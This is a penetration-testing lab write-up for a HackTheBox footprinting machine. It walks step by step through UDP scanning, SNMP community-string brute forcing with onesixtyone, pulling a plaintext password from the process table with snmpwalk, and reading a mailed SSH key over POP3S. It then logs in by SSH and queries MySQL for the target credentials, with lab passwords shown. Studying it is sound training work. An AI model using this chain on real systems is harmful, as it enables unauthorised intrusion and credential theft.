# 🏴️ Footprinting Tests - Hard

> **Difficulty:** Hard | **OS:** Linux | **Platform:** CPTS — Footprinting Study

!!! info "About this page"
    Writeup of the footprinting lab (hard machine) from HackTheBox. The most
    protected server in scope: with no obvious vector on TCP, it was necessary
    to **enumerate UDP**, crack the **SNMP community string**, extract
    credentials and an SSH key, and pivot to **MySQL** to obtain the `HTB`
    user's credentials.

!!! note "About the IPs"
    The target was reset during the study, so the IP changes between output
    blocks (`10.129.202.20`, `10.129.62.80`). The outputs were kept exactly as
    they appeared in the terminal.

---

## 📋 General Information

| Field | Value |
|:------|:------|
| **Hostname** | `NIXHARD` |
| **IP** | `10.129.202.20` |
| **OS** | Linux — Ubuntu (kernel 5.4.0-90-generic x86_64) |
| **Difficulty** | Hard |
| **Platform / Module** | CPTS — Footprinting |
| **Internal domain** | `inlanefreight.htb` |
| **Date** | 25/06/2026 |
| **Status** | Finished |

!!! abstract "Objective"
    The third and last server in scope, the most protected of the three. It
    requires chaining information from multiple services to gain access. As
    proof of compromise, the `HTB` user's credentials need to be recovered.

---

## 🔍 Initial Enumeration

### Ports and Services Found

| Port | Service | Version / Banner |
|:------|:--------|:----------------|
| 22/tcp | ssh | OpenSSH |
| 110/tcp | pop3 | — |
| 143/tcp | imap | — |
| 993/tcp | imaps | — |
| 995/tcp | pop3s | — |
| **161/udp** | **snmp** | **net-snmp SNMPv3 server** |

### Enumeration Commands

```bash
# Initial TCP scan
sudo nmap -sS -Pn -n --disable-arp-ping -D RND:5 10.129.202.20

# No obvious TCP vector → UDP scan on the most common ports
sudo nmap -sU --top-ports 20 -oN nmap-udp.txt 10.129.202.20

# Confirming the SNMP service
sudo nmap -sV -sU -Pn -p161 --script snmp-info 10.129.62.80
```

### Relevant Output (evidence)

```shell
# --- TCP ---
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s

# --- UDP (NIXHARD) ---
PORT      STATE         SERVICE
161/udp   open          snmp

# --- snmp-info ---
PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info:
|   enterprise: net-snmp
|   engineIDData: 5b99e75a10288b6100000000
|   snmpEngineBoots: 10
```

### Findings

- [x] Exposed mailbox (POP3/IMAP/POP3S/IMAPS), but **no direct vector** on TCP
- [x] `commonName=NIXHARD` recovered from certificates → target's hostname
- [x] **SNMP (161/udp)** open — the vector that unlocked the machine, only visible in the UDP scan

---

## 🎯 Techniques Used

| # | Technique | Where / How it was applied |
|:--|:--------|:-------------------------|
| 1 | UDP enumeration | `nmap -sU` reveals SNMP (161) after TCP yielded no vector |
| 2 | Community string brute force | `onesixtyone` + SNMP discovery wordlist → community `backup` |
| 3 | Information extraction via SNMP | `snmpwalk -c backup` leaks `tom`'s password in process arguments |
| 4 | Webmail access via POP3S | `curl pop3s://` reads `tom`'s email containing a private SSH key |
| 5 | SSH key reuse | Login as `tom` with the `id_rsa` exfiltrated from the email |
| 6 | Pivot to MySQL | `.bash_history` points to MySQL usage → `SELECT * FROM users` → `HTB`'s password |

---

## 🚀 Exploitation / Initial Access

### Entry Vector

| Field | Value |
|:------|:------|
| **Vector** | SNMP (161/udp) → credentials + SSH key → MySQL |
| **Flaw exploited** | Weak community string (`backup`) exposing sensitive data via SNMP |
| **Tools** | nmap, onesixtyone, snmpwalk, curl, ssh, mysql |
| **Access obtained as** | `tom` (SSH) |

### Process

```
1. No TCP vector → UDP scan → SNMP (161) open
2. Community string brute force with onesixtyone → "backup"
3. snmpwalk -c backup → tom's password (NMds732Js2761) in the args of /opt/tom-recovery.sh
4. Direct SSH with the password fails → read tom's email via POP3S
5. Email contains id_rsa (private SSH key) → login as tom
6. .bash_history shows "mysql -u tom -p" → enter MySQL
7. SELECT * FROM users → record 150 → HTB's credentials
```

---

### Stage 1 — SNMP: community string brute force

With no tools I was familiar with for SNMP, I used `onesixtyone` with a
discovery wordlist, which found the community string **`backup`**:

```bash
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt 10.129.62.80
```

![SNMP community string brute force with onesixtyone](../img/footprinting-tests-hard/01-snmp-bruteforce.png)

### Stage 2 — `snmpwalk`: `tom`'s password leaked

With the `backup` community, `snmpwalk` revealed the running process table,
including `/opt/tom-recovery.sh` with **`tom`'s password in plaintext** in the
arguments:

```bash
snmpwalk -v2c -c backup 10.129.62.80
```

```shell
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
...
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
```

![snmpwalk with the backup community reveals tom's password](../img/footprinting-tests-hard/02-snmpwalk-tom-creds.png)

!!! success "Credentials obtained (SNMP)"
    - **User:** `tom`
    - **Password:** `NMds732Js2761`
    - **Suspicious script:** `/opt/tom-recovery.sh`

### Stage 3 — POP3S: `tom`'s email with the SSH key

!!! warning "Attempt that did NOT work"
    Direct login via **SSH** with the password `NMds732Js2761` failed. Accessing
    the mailbox via POP3S also closed the connection when trying to read
    through the interactive session — the solution was to request the message
    directly with `curl`.

```bash
curl -k "pop3s://10.129.62.80/1" --user "tom:NMds732Js2761"
```

```shell
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
... (tom's private OpenSSH key — truncated) ...
-----END OPENSSH PRIVATE KEY-----
```

![Reading tom's email via POP3S with the SSH key](../img/footprinting-tests-hard/03-pop3s-tom-email.png)

!!! success "Key obtained (POP3S)"
    `tom`'s private SSH key (`id_rsa`), sent by email from `Admin`.

---

## 🐚 Shell and Post-Access

### Stage 4 — SSH as `tom` with the exfiltrated key

```bash
# Save the key from the email as id_rsa
chmod 600 id_rsa
ssh -i id_rsa tom@10.129.62.80
```

![SSH access as tom — reading .mysql_history](../img/footprinting-tests-hard/04-ssh-access-tom.png)

Access obtained as `tom@NIXHARD`. The `.mysql_history` already showed queries
against the `users` table.

### Stage 5 — `.bash_history`: the MySQL clue

```bash
cat .bash_history
```

```shell
mysql -u tom -p
ssh-keygen -t rsa -b 4096
```

![Content of tom's .bash_history](../img/footprinting-tests-hard/05-bash-history.png)

!!! tip "Clue"
    The history shows that `tom` accesses **MySQL** locally (`mysql -u tom -p`)
    — the next step is to log into the database by reusing `tom`'s password.

### Stage 6 — MySQL: `HTB`'s credentials

```bash
mysql -u tom -p   # password: NMds732Js2761
```

![Successful MySQL login as tom](../img/footprinting-tests-hard/06-mysql-login-tom.png)

```sql
show databases;
use users;
SELECT * FROM users;
```

![Navigating MySQL in search of the HTB user](../img/footprinting-tests-hard/07-mysql-navigation.png)

![users table with the credential records](../img/footprinting-tests-hard/08-mysql-users-table.png)

Among the records, the `HTB` user (id `150`) with the target password:

![HTB user's credentials found](../img/footprinting-tests-hard/09-htb-password-found.png)

```text
150 | HTB | cr3n4o7rzse7rzhnckhssncif7ds
```

!!! success "Objective achieved (users table — MySQL)"
    - **User:** `HTB`
    - **Password:** `cr3n4o7rzse7rzhnckhssncif7ds`

---

## 🚩 Flags

- [x] `HTB` user's credentials captured

| Credential | Location |
|:-----------|:------|
| `HTB:cr3n4o7rzse7rzhnckhssncif7ds` | `users` table (MySQL), record `150` |

---

## 📖 Technical Summary

| Field | Value |
|:------|:------|
| **Root cause** | Weak SNMP community string (`backup`) exposing credentials via process arguments |
| **Attack chain** | UDP/SNMP → community `backup` → `tom`'s password → POP3S email → SSH key → `tom` shell → MySQL → `HTB` creds |
| **Final access** | `tom` (SSH) + `HTB`'s credentials |

---

## 💡 Lessons Learned

- **What worked:** not stopping at TCP. The entire vector depended on
  **enumerating UDP** and cracking SNMP — without that the machine looked like
  it had no way in.
- **What slowed things down:** insisting on SSH with `tom`'s password (it
  failed) and trying to read the email through the interactive POP3S session;
  the working path was `curl pop3s://.../1`.
- **Commands to review later:** `onesixtyone` for community strings,
  `snmpwalk -v2c -c <community>` for extraction, `curl pop3s://` for reading
  emails.
- **Techniques to study further:** SNMP frequently exposes process arguments
  with plaintext passwords; always review `~/.bash_history` and
  `~/.mysql_history` after obtaining a shell.
